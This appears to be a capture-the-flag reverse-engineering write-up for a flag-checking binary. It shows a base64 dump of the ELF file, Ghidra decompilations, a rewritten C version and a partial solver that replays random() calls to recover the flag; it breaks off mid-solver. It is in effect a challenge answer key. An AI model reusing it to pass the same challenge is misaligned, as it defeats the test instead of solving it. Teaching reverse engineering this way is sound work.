AAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKARAAAAAAAAYBEAAAAA\nAAABAAAAAAAAAFYAAAAAAAAADAAAAAAAAAAAEAAAAAAAAA0AAAAAAAAAMBYAAAAAAAAZAAAAAAAA\nANA9AAAAAAAAGwAAAAAAAAAIAAAAAAAAABoAAAAAAAAA2D0AAAAAAAAcAAAAAAAAAAgAAAAAAAAA\n9f7/bwAAAACgAwAAAAAAAAUAAAAAAAAAGAUAAAAAAAAGAAAAAAAAAMgDAAAAAAAACgAAAAAAAAC8\nAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAAVAAAAAAAAAAAAAAAAAAAAAwAAAAAAAADoPwAAAAAAAAIA\nAAAAAAAAwAAAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAAAAAAAADgBgAAAAAAAAcAAAAAAAAAIAYA\nAAAAAAAIAAAAAAAAAMAAAAAAAAAACQAAAAAAAAAYAAAAAAAAAPv//28AAAAAAAAACAAAAAD+//9v\nAAAAAPAFAAAAAAAA////bwAAAAABAAAAAAAAAPD//28AAAAA1AUAAAAAAAD5//9vAAAAAAMAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAA4D0AAAAAAAAAAAAAAAAAAAAAAAAAAAAANhAAAAAAAABGEAAAAAAAAFYQAAAAAAAA\nZhAAAAAAAAB2EAAAAAAAAIYQAAAAAAAAlhAAAAAAAACmEAAAAAAAAAAAAAAAAAAASEAAAAAAAABH\nQ0M6IChEZWJpYW4gMTIuMi4wLTE0KSAxMi4yLjAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEA\nAAAEAPH/AAAAAAAAAAAAAAAAAAAAAAkAAAABAAQAfAMAAAAAAAAgAAAAAAAAABMAAAAEAPH/AAAA\nAAAAAAAAAAAAAAAAAB4AAAACAA8A8BAAAAAAAAAAAAAAAAAAACAAAAACAA8AIBEAAAAAAAAAAAAA\nAAAAADMAAAACAA8AYBEAAAAAAAAAAAAAAAAAAEkAAAABABoAUEAAAAAAAAABAAAAAAAAAFUAAAAB\nABUA2D0AAAAAAAAAAAAAAAAAAHwAAAACAA8AoBEAAAAAAAAAAAAAAAAAAIgAAAABABQA0D0AAAAA\nAAAAAAAAAAAAAKcAAAAEAPH/AAAAAAAAAAAAAAAAAAAAABMAAAAEAPH/AAAAAAAAAAAAAAAAAAAA\nAK4AAAABABMAVCEAAAAAAAAAAAAAAAAAAAAAAAAEAPH/AAAAAAAAAAAAAAAAAAAAALwAAAABABYA\n4D0AAAAAAAAAAAAAAAAAAMUAAAAAABIAVCAAAAAAAAAAAAAAAAAAANgAAAABABgA6D8AAAAAAAAA\nAAAAAAAAAO4AAAASAAAAAAAAAAAAAAAAAAAAAAAAAAsBAAAgAAAAAAAAAAAAAAAAAAAAAAAAAIAB\nAAAgABkAQEAAAAAAAAAAAAAAAAAAACcBAAASAAAAAAAAAAAAAAAAAAAAAAAAADgBAAAQABkAUEAA\nAAAAAAAAAAAAAAAAAD8BAAASAhAAMBYAAAAAAAAAAAAAAAAAAEUBAAASAAAAAAAAAAAAAAAAAAAA\nAAAAAFgBAAASAAAAAAAAAAAAAAAAAAAAAAAAAGsBAAASAAAAAAAAAAAAAAAAAAAAAAAAAH4BAAAQ\nABkAQEAAAAAAAAAAAAAAAAAAAIsBAAASAAAAAAAAAAAAAAAAAAAAAAAAAJ4BAAAgAAAAAAAAAAAA\nAAAAAAAAAAAAAK0BAAARAhkASEAAAAAAAAAAAAAAAAAAALoBAAARABEAACAAAAAAAAAEAAAAAAAA\nAMkBAAASAAAAAAAAAAAAAAAAAAAAAAAAANwBAAASAAAAAAAAAAAAAAAAAAAAAAAAAO8BAAAQABoA\nWEAAAAAAAAAAAAAAAAAAAIQBAAASAA8AwBAAAAAAAAAiAAAAAAAAAPQBAAAQABoAUEAAAAAAAAAA\nAAAAAAAAAAACAAASAA8ApxUAAAAAAACJAAAAAAAAAAUCAAASAAAAAAAAAAAAAAAAAAAAAAAAABYC\nAAARAhkAUEAAAAAAAAAAAAAAAAAAACICAAASAA8AqREAAAAAAAD+AwAAAAAAACkCAAAgAAAAAAAA\nAAAAAAAAAAAAAAAAAEMCAAAiAAAAAAAAAAAAAAAAAAAAAAAAAF4CAAASAgwAABAAAAAAAAAAAAAA\nAAAAAABTY3J0MS5vAF9fYWJpX3RhZwBjcnRzdHVmZi5jAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9f\nZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21wbGV0ZWQuMABfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmlu\naV9hcnJheV9lbnRyeQBmcmFtZV9kdW1teQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkA\nZmxhZy5jAF9fRlJBTUVfRU5EX18AX0RZTkFNSUMAX19HTlVfRUhfRlJBTUVfSERSAF9HTE9CQUxf\nT0ZGU0VUX1RBQkxFXwBfX2xpYmNfc3RhcnRfbWFpbkBHTElCQ18yLjM0AF9JVE1fZGVyZWdpc3Rl\nclRNQ2xvbmVUYWJsZQBwdXRzQEdMSUJDXzIuMi41AF9lZGF0YQBfZmluaQBzdHJsZW5AR0xJQkNf\nMi4yLjUAc3RyY2hyQEdMSUJDXzIuMi41AHByaW50ZkBHTElCQ18yLjIuNQBfX2RhdGFfc3RhcnQA\nc3RyY21wQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAF9fZHNvX2hhbmRsZQBfSU9fc3RkaW5f\ndXNlZAByYW5kb21AR0xJQkNfMi4yLjUAc3Ryc2VwQEdMSUJDXzIuMi41AF9lbmQAX19ic3Nfc3Rh\ncnQAbWFpbgBhdG9pQEdMSUJDXzIuMi41AF9fVE1DX0VORF9fAGlzRmxhZwBfSVRNX3JlZ2lzdGVy\nVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEdMSUJDXzIuMi41AF9pbml0AAAuc3ltdGFiAC5z\ndHJ0YWIALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuZ251LnByb3BlcnR5AC5ub3RlLmdudS5idWls\nZC1pZAAubm90ZS5BQkktdGFnAC5nbnUuaGFzaAAuZHluc3ltAC5keW5zdHIALmdudS52ZXJzaW9u\nAC5nbnUudmVyc2lvbl9yAC5yZWxhLmR5bgAucmVsYS5wbHQALmluaXQALnBsdC5nb3QALnRleHQA\nLmZpbmkALnJvZGF0YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV9h\ncnJheQAuZHluYW1pYwAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAB\nAAAAAgAAAAAAAAAYAwAAAAAAABgDAAAAAAAAHAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAA\nAAAjAAAABwAAAAIAAAAAAAAAOAMAAAAAAAA4AwAAAAAAACAAAAAAAAAAAAAAAAAAAAAIAAAAAAAA\nAAAAAAAAAAAANgAAAAcAAAACAAAAAAAAAFgDAAAAAAAAWAMAAAAAAAAkAAAAAAAAAAAAAAAAAAAA\nBAAAAAAAAAAAAAAAAAAAAEkAAAAHAAAAAgAAAAAAAAB8AwAAAAAAAHwDAAAAAAAAIAAAAAAAAAAA\nAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABXAAAA9v//bwIAAAAAAAAAoAMAAAAAAACgAwAAAAAAACQA\nAAAAAAAABgAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAYQAAAAsAAAACAAAAAAAAAMgDAAAAAAAAyAMA\nAAAAAABQAQAAAAAAAAcAAAABAAAACAAAAAAAAAAYAAAAAAAAAGkAAAADAAAAAgAAAAAAAAAYBQAA\nAAAAABgFAAAAAAAAvAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABxAAAA////bwIAAAAA\nAAAA1AUAAAAAAADUBQAAAAAAABwAAAAAAAAABgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAfgAAAP7/\n/28CAAAAAAAAAPAFAAAAAAAA8AUAAAAAAAAwAAAAAAAAAAcAAAABAAAACAAAAAAAAAAAAAAAAAAA\nAI0AAAAEAAAAAgAAAAAAAAAgBgAAAAAAACAGAAAAAAAAwAAAAAAAAAAGAAAAAAAAAAgAAAAAAAAA\nGAAAAAAAAACXAAAABAAAAEIAAAAAAAAA4AYAAAAAAADgBgAAAAAAAMAAAAAAAAAABgAAABgAAAAI\nAAAAAAAAABgAAAAAAAAAoQAAAAEAAAAGAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAXAAAAAAAAAAAA\nAAAAAAAABAAAAAAAAAAAAAAAAAAAAJwAAAABAAAABgAAAAAAAAAgEAAAAAAAACAQAAAAAAAAkAAA\nAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAACnAAAAAQAAAAYAAAAAAAAAsBAAAAAAAACwEAAA\nAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAsAAAAAEAAAAGAAAAAAAAAMAQAAAA\nAAAAwBAAAAAAAABwBQAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAALYAAAABAAAABgAAAAAA\nAAAwFgAAAAAAADAWAAAAAAAACQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAC8AAAAAQAA\nAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAFIAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA\nxAAAAAEAAAACAAAAAAAAAFQgAAAAAAAAVCAAAAAAAAA0AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAA\nAAAAAAAAANIAAAABAAAAAgAAAAAAAACIIAAAAAAAAIggAAAAAAAA0AAAAAAAAAAAAAAAAAAAAAgA\nAAAAAAAAAAAAAAAAAADcAAAADgAAAAMAAAAAAAAA0D0AAAAAAADQLQAAAAAAAAgAAAAAAAAAAAAA\nAAAAAAAIAAAAAAAAAAgAAAAAAAAA6AAAAA8AAAADAAAAAAAAANg9AAAAAAAA2C0AAAAAAAAIAAAA\nAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAPQAAAAGAAAAAwAAAAAAAADgPQAAAAAAAOAtAAAA\nAAAA4AEAAAAAAAAHAAAAAAAAAAgAAAAAAAAAEAAAAAAAAACrAAAAAQAAAAMAAAAAAAAAwD8AAAAA\nAADALwAAAAAAACgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA/QAAAAEAAAADAAAAAAAA\nAOg/AAAAAAAA6C8AAAAAAABYAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAYBAAABAAAA\nAwAAAAAAAABAQAAAAAAAAEAwAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAM\nAQAACAAAAAMAAAAAAAAAUEAAAAAAAABQMAAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAA\nAAAAAAAAEQEAAAEAAAAwAAAAAAAAAAAAAAAAAAAAUDAAAAAAAAAfAAAAAAAAAAAAAAAAAAAAAQAA\nAAAAAAABAAAAAAAAAAEAAAACAAAAAAAAAAAAAAAAAAAAAAAAAHAwAAAAAAAAIAQAAAAAAAAdAAAA\nEgAAAAgAAAAAAAAAGAAAAAAAAAAJAAAAAwAAAAAAAAAAAAAAAAAAAAAAAACQNAAAAAAAAGQCAAAA\nAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAEQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAA9DYAAAAA\nAAAaAQAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA=="}
```

Turning it back to binary format is easy, we can use Cyberchef for that with `From Base64` recipe. Just making sure to remove `\n` characters `base64` command left there. Then we can confirm we actually got a binary with:

```bash
$ file binary
binary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), too many program (39949)
```

So let's try to decompile it with Ghidra. This way we can get the body of main function:

```c

undefined8 main(int param_1,undefined8 *param_2)

{
  int iVar1;
  undefined8 uVar2;
  
  if (param_1 < 2) {
    printf("Usage: %s <secret>\n",*param_2);
    uVar2 = 1;
  }
  else {
    iVar1 = isFlag(param_2[1],"denied",&DAT_0010202b);
    if (iVar1 < 1) {
      puts("Nope.");
    }
    else {
      puts("Yes, that\'s the flag");
    }
    uVar2 = 0;
  }
  return uVar2;
}
```

As we can see it calls isFlag function, which is the following:

```c

undefined8 isFlag(char *param_1,char *param_2,char *param_3)

{
  byte bVar1;
  int iVar2;
  size_t sVar3;
  char *pcVar4;
  long lVar5;
  int iVar6;
  ulong uVar7;
  char *local_c0;
  int aiStack_b8 [5];
  undefined4 local_a4;
  int local_a0;
  int local_9c;
  int local_98;
  int local_94;
  int local_90;
  int local_8c;
  undefined4 local_88;
  undefined4 local_84;
  int local_80;
  int local_7c;
  int local_78;
  int local_74;
  int local_70;
  int local_6c;
  int local_68;
  int local_64;
  int local_60;
  undefined4 local_5c;
  char *local_50;
  int local_44;
  char *local_40;
  int local_34;
  char local_2d;
  int local_2c;
  int local_28;
  int local_24;
  uint local_20;
  uint local_1c;
  
  local_c0 = param_1;
  sVar3 = strlen(param_1);
  if (((sVar3 == 0x1e) && (pcVar4 = strchr(local_c0,0x7b), pcVar4 != (char *)0x0)) &&
     (pcVar4 = strchr(local_c0,0x7d), pcVar4 != (char *)0x0)) {
    local_50 = strsep(&local_c0,"{");
    local_40 = strsep(&local_c0,"}");
    local_1c = 0;
    for (local_20 = 0; uVar7 = (ulong)local_20, sVar3 = strlen(local_50), uVar7 < sVar3;
        local_20 = local_20 + 1) {
      local_1c = local_1c + (int)local_50[local_20];
    }
    local_1c = local_1c * 0x73c;
    local_24 = 0;
    for (local_28 = 0; uVar7 = (ulong)local_28, sVar3 = strlen(param_3), uVar7 < sVar3;
        local_28 = local_28 + 1) {
      local_24 = local_24 + param_3[local_28];
    }
    pcVar4 = strsep(&local_50,"c");
    aiStack_b8[4] = atoi(pcVar4);
    aiStack_b8[4] = aiStack_b8[4] + -0x4cf;
    aiStack_b8[2] = 2;
    aiStack_b8[3] = 0x52;
    local_a4 = 0x22;
    sVar3 = strlen(local_c0);
    local_6c = (int)sVar3 + 0x29;
    local_7c = aiStack_b8[2] * 0x32;
    local_90 = local_7c + -10;
    aiStack_b8[1] = 0x1da;
    sVar3 = strlen(local_c0);
    local_a0 = (int)sVar3 * 2 + 0x31;
    local_98 = 0x4a;
    sVar3 = strlen(param_2);
    local_94 = (int)sVar3;
    local_9c = aiStack_b8[1] / 6;
    local_60 = local_9c + local_a0 + 1;
    local_8c = local_7c + 5;
    local_88 = 0x52;
    local_84 = 0xec;
    local_80 = 0xed;
    local_78 = aiStack_b8[1] - local_6c;
    local_74 = local_94 << 2;
    sVar3 = strlen(local_c0);
    iVar2 = (int)sVar3 * 0xf9 + 0x15e;
    local_80 = local_80 + 1;
    local_68 = local_24 + 0xe;
    local_6c = local_6c + 1;
    local_64 = local_98 / 10 + local_1c / (uint)(local_80 * 10);
    local_70 = iVar2;
    sVar3 = strlen(local_c0);
    local_70 = (int)sVar3 * iVar2;
    local_80 = local_80 + 1;
    local_6c = local_6c + 1;
    iVar6 = local_94 * aiStack_b8[2];
    iVar2 = strcmp(local_50,"n0t_th1z_w4y");
    local_60 = aiStack_b8[2] + (iVar6 - iVar2);
    local_5c = 0x1d;
    local_70 = local_70 + 0x15e;
    local_2c = 1;
    while( true ) {
      if (0x17 < local_2c) {
        return 1;
      }
      local_44 = aiStack_b8[local_2c];
      for (local_34 = 0; local_34 < local_44; local_34 = local_34 + 1) {
        lVar5 = random();
        bVar1 = (byte)(lVar5 >> 0x3f);
        local_2d = ((char)lVar5 + (bVar1 >> 1) & 0x7f) - (bVar1 >> 1);
      }
      if (local_2d != local_40[(long)local_2c + -1]) break;
      local_2c = local_2c + 1;
    }
    return 0;
  }
  return 0;
}
```

Finally, this is the true REV part of the challenge. Now it's gonna be easy.

Analyzing the code we can imagine in plain C it would be something like:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int isFlag(char* secret, char* param1, char* param2)
{
    char *prefix, *content;

    if(strlen(secret) != 30)
       return 0;

    if(strchr(secret, '{') == NULL || strchr(secret, '}') == NULL)
        return 0;

    prefix = strsep(&secret, "{");
    content = strsep(&secret, "}");

    unsigned int seed = 0;
    for(unsigned int i = 0; i < strlen(prefix); i++)
        seed += prefix[i];
    
    seed *= 1753 + 'c';

    int pauses[24];
    
    int sum = 0;
    for(int i = 0; i < strlen(param2); i++)
        sum += param2[i];
    
    pauses[4] = atoi(strsep(&prefix, "c")) - 1231;
   
    pauses[2] = 1 + 1;
    pauses[pauses[2] + 1] = 82;
    pauses[5] = 17 * pauses[2];
    pauses[19] = 41 + strlen(secret);
    pauses[15] = pauses[2] * 50; 
    pauses[10] = pauses[15] - 10; 
    pauses[1] = 474;
    pauses[6] = 49 + (2 * strlen(secret));
    pauses[8] = 74;
    pauses[9] = strlen(param1);
    pauses[7] = pauses[1] / 6;
    pauses[22] = pauses[6] + pauses[7] + 1;
    pauses[11] = pauses[15] + 5; 
    pauses[12] = 82;
    pauses[14] = 236;
    pauses[13] = pauses[14];
    pauses[14]++;  
    pauses[16] = pauses[1] - pauses[19]; 
    pauses[17] = pauses[9] * 4;
    pauses[18] = (pauses[14] + 12) * strlen(secret) + 350;
    pauses[14]++;
    pauses[20] = sum + 14;
    pauses[19]++;
    pauses[21] = seed / ((pauses[14]) * 10) + (pauses[8] / 10);
    pauses[18] *= strlen(secret);
    pauses[14]++;
    pauses[19]++;
    pauses[22] = -strcmp(prefix, "n0t_th1z_w4y") +  pauses[9] * pauses[2] + pauses[2];
    pauses[23] = (2 << 12) / 282;
    pauses[18] += 350;

    for(int i = 1; i <= 23; i++)
    {
        char c;
        int p = pauses[i];
        for(int j = 0; j < p; j++)
            c = random() % 128;

        if(c != content[i - 1])
            return 0;
    }

    return 1;
}

int main(int argc, char* argv[]) {

    if(argc < 2) {
        printf("Usage: %s <secret>\n", argv[0]);
        return 1;
    }

    if(isFlag(argv[1], "denied", "xdxd") > 0) {
        printf("Yes, that's the flag\n");
    } else {
        printf("Nope.\n");
    }
    
    return 0;
}
```

What a peculiar way. It seems that this splits the flag into a prefix and a content between curly braces, then computes a series of numbers from the prefix, secret length, and additional parameters. 

Finally, it runs a loop where it calls random() a computed number of times for each content character, comparing the last generated random byte to the corresponding flag character. If all characters match, the flag is accepted.

Basically it calculates which steps in the random generator indicates values of ascii characters in the flag. For each character position, it runs the random generator a computed number of times, and the final random value (mod 128) must equal the ASCII code of the corresponding flag character.

We can try to write a code that reverses it slightly modifying the original code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int getFlag(char* secret, char* param1, char* param2)
{
    char *prefix, *content;

    printf("REVERSING...");

    if(strlen(secret) != 30)
    {
       printf("Invalid secret length\n");
       return 0;
    }

    if(strchr(secret, '{') == NULL || strchr(secret, '}') == NULL)
    {
        printf("Invalid secret format\n");
        return 0;
    }

    prefix = strsep(&secret, "{");
    content = strsep(&secret, "}");

    unsigned int seed = 0;
    for(unsigned int i = 0; i < strlen(prefix); i++)
        seed += prefix[i];
    
    seed *= 1753 + 'c';

    printf("Seed is %d\n", seed);

    int pauses[24];
    
    int sum = 0;
    for(int i = 0; i < strlen(param2); i++)
        sum += param2[i];
    
    pauses[4] = atoi(strsep(&prefix, "c")) - 1231;
   
    pauses[2] = 1 + 1;
    pauses[pauses[2] + 1] = 82;
    pauses[5] = 17 * pauses[2];
    pauses[19] = 41 + strlen(secret);
    pauses[15] = pauses[2] * 50; 
    pauses[10] = pauses[15] - 10; 
    pauses[1] = 474;
    pauses[6] = 49 + (2 * strlen(secret));
    pauses[8] = 74;
    pauses[9] = strlen(param1);
    pauses[7] = pauses[1] / 6;
    pauses[22] = pauses[6] + pauses[7] + 1;
    pauses[11] = pauses[15] + 5; 
    pauses[12] = 82;
    pauses[14] = 236;
    pauses[13] = pauses[14];
    pauses[14]++;  
    pauses[16] = pauses[1] - pauses[19]; 
    pauses[17] = pauses[9] * 4;
    pauses[18] = (pauses[14] + 12) * strlen(secret) + 350;
    pauses[14]++;
    pauses[20] = sum + 14;
    pauses[19]++;
    pauses[21] = seed / ((pauses[14]) * 10) + (pauses[8] / 10);
    pauses[18] *= strlen(secret);
    pauses[14]++;
    pauses[19]++;
    pauses[22] = -strcmp(prefix, "n0t_th1z_w4y") +  pauses[9] * pauses[2] + pauses[2];
    pauses[23] = (2 << 12) / 282;
    pauses[18] += 350;

    for(int i = 1; i <= 23; i++)
    {
        char c;
        int p = pauses[i];
        for(int j = 0; j < p; j++)
            c = random() % 128;

        printf("%c", c);
    }

    return 1;
}

int main(int argc, char* argv[]) {
    char secret[50];
